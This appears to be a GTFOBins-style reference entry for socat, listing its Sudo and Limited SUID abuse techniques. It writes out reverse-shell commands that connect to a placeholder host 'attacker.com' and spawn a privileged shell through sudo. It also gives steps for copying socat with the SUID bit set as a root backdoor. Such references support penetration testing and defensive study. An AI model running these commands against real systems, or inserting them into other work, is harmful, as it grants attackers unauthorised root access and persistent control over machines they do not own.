***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to
      receive the shell.
      RHOST=attacker.com
      RPORT=12345
      sudo -E socat tcp-connect:$RHOST:$RPORT exec:
      sh,pty,stderr,setsid,sigint,sane
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to
      receive the shell.
      sudo sh -c 'cp $(which socat) .; chmod +s ./socat'

      RHOST=attacker.com
      RPORT=12345
      ./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
